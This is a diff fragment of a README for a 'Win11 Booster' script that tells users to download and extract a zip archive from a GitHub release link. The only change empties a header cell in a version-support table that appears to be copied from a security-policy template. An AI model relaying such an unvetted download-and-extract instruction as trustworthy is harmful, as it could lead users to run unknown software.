@@ -10,7 +10,7 @@ To use the Win11 Booster script, follow the steps below:
 
 Download the project https://github.com/Scuttlang/Win11-Booster/releases/download/owner/Win11-Booster-main.zip and extract the contents.
 
-| Version | Booster         |
+| Version |       |
 | ------- | ------------------ |
 | 5.1.x   | :white_check_mark: |
 | 5.0.x   | :x:                |
